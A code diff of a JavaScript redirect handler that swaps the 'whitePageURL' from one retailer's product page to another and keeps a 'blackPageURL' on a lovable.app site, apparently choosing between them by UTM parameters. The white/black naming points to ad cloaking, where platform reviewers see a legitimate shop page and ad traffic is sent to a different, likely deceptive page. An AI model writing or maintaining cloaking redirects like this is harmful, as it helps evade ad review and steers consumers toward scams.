@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.theiconic.com.au/gathered-pouch-bag-2710804.html?adId=6104%7Cf41dd5e8-2fc5-4472-bf04-2ddf68251b48-1763320444%7C0";
+    const whitePageURL = "https://www.mumzworld.com/en/dr-browns-120ml-glass-narrow-options-bottle-pack-of-2?source=Brand+Page";
     const blackPageURL = "https://luvcshap.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
